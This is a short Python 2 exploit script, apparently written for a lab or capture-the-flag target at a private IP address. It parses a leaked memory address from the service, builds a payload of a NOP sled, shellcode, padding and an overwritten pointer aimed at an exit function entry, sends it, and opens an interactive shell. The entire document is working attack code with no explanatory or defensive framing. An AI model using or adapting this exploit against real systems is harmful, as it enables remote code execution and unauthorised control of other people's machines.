from pwn_expoit import *
import time
a = 0.3
def MakeCon():
  MakeCon = remote("192.168.224.152",4444)
  return MakeCon

s = MakeCon()
leak = s.recvuntil("[size=260]")[-18:-11]
hex_addr = int("0x"+leak,16)
print hex_addr
exit_func = 0x804c8ac
dat  = ""
dat += "\xeb\x0c"
dat += nopsled(30)
dat += shellcode(32)
dat += "A"*(260-len(dat))
dat += "\x01\x00\x00\x00"
dat += p32(exit_func-0x8)
dat += p32(hex_addr)
time.sleep(a)
s.send(dat+"\n")
s.interactive()
